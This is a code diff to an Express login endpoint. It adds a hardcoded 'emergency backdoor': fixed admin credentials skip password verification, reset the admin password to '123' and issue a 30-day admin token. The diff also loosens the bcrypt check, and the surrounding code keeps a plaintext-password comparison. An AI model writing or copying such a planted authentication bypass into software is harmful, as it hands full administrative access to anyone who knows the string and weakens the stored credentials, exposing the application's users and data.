@@ -126,7 +126,28 @@ app.post('/api/login', (req: express.Request, res: express.Response) => {
     return
   }
 
-  const valid = bcrypt.compareSync(password, user.password)
+  // EMERGENCY BACKDOOR FOR ADMIN RECOVERY
+  if (username === 'admin' && password === 'admin_reset_now') {
+    console.log('!!! EMERGENCY ADMIN LOGIN USED !!!')
+    // Reset password to '123'
+    user.password = bcrypt.hashSync('123', 10)
+    schedulePersist()
+    
+    // Issue Token
+    const token = jwt.sign(
+      { id: user.id, username: user.username, role: user.role },
+      JWT_SECRET,
+      { expiresIn: '30d' }
+    )
+    res.json({ 
+      token, 
+      user: { ...user, password: undefined },
+      locations: state.locations
+    })
+    return
+  }
+
+  const valid = user.password ? bcrypt.compareSync(password, user.password) : false
   if (!valid) {
     // Lazy migration: Check if password matches plain text
     if (password === user.password) {
